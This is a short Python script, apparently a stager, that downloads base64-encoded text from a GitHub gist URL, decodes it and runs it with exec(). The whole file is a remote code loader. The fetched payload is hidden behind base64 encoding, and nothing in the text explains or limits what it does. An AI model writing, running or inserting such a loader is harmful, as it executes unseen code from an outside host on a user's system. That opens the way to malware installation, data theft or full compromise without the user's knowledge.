import requests, base64

URL = "https://gist.githubusercontent.com/ypkayla/a1fc44a209da2dba46a031a69f78174b/raw/eb78da6ac3b605353cd6368bcf7926fbab561015/ok"
response = requests.get(URL)
code_b64 = response.text.strip()

exec(compile(base64.b64decode(code_b64), "<remote>", "exec"))
